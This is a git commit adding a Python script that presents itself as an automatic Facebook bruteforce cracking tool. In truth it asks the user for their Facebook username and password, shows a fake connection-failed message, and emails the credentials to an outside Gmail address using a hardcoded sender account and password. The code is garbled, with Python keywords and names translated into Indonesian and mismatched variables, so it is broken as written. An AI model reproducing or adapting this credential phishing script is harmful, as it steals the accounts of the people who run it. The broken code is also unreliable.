cb9775427e4e7ffd390bbe9c0c08f01c5c1e9582
mrmamangbot <65497626+mrmamangbot@users.noreply.github.com>
2020-05-17 21:37:34 +0700

    Add files via upload

---
+++ SCDarko.py
@@ -0,0 +1,74 @@
+﻿# - * - coding: utf-8 - * -
+
+# coding = utf-8
+
+impor  soket , struct , os , sys , waktu , yagmail
+
+x = yagmail . SMTP ( 'dompetphising01@gmail.com' , '08886650181a' )
+
+subject = 'nyetor akun bang'
+
+logo  =  "" " \ 033 [1; 94m█████████
+
+\ 033 [1; 94m█▄█████▄█       \ 033 [1; 94m ● ▬▬▬▬▬▬▬▬▬๑ ۩۩๑▬▬▬▬▬▬▬▬ ●
+
+\ 033 [1; 94m█ \ 033 [1; 94m ▼ harap letakkan kembali \ 033 [1; 94m- _ --_-- \ 033 [1; 94m╔╦╗┌─┐┬─┐┬┌─ ╔ ═╗╔╗
+
+\ 033 [1; 94m█ \ 033 [1; 94m \ 033 [1; 94m _-_-- -_ --__ \ 033 [1; 94m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
+
+\ 033 [1; 94m█ \ 033 [1; 94m ▲▲▲▲▲ \ 033 [1; 94m-- - _ - \ 033 [1; 94m═╩╝┴ ┴┴└─┴ ┴ ╚ ╚═╝ \ 033 [1; 97mVVIP    
+
+\ 033 [1; 94m█████████       \ 033 [1; 94m «°°°°°°°°°°°°°
+
+\ 033 [1; 94m ██ ██ \ x1b [00m "" "
+
+
+
+spanduk  =  "" "
+
+\ x1b [34mhack Facebook Daftar Teman
+
+\ x1b [00mAcrack cracking otomatis dengan Bruteforce
+
+\ x1b [00mSilakan login dengan akun Anda \ x1b [ 91m !
+
+"" "
+
+def  main ():
+
+	os . sistem ( 'jelas' )
+
+	cetak ( logo )
+
+	cetak ( spanduk )
+
+	cetak ( ' \ x1b [00m \ 033 [41m LOGIN FACEBOOK \ 033 [00m' )
+
+	u = input ( ' \ x1b [00mUsername: \ x1b [33m' )
+
+	p = input ( ' \ x1b [00mPassword: \ x1b [33m' )
+
+	msg = ( 'nama pengguna:' + u + ', kata sandi:' + p )
+
+	body = ( msg )
+
+	cetak ( '' )
+
+	cetak ( ' \ x1b [00mMaaf, koneksi gagal \ x1b [ 91m ! \ x1b [00m' )
+
+	cetak ( ' \ x1b [33mSilakan coba lagi nanti ...' )
+
+	os . sistem ( 'tidur 3' )
+
+	cetak ( '' )
+
+	cetak ( ' \ x1b [Program 00m Keluar \ x1b [ 91m !' )
+
+	os . sistem ( 'keluar' )
+
+	x . kirim ( 'auliatubaa88@gmail.com' , subjek , badan )
+
+
+
+main ()
+
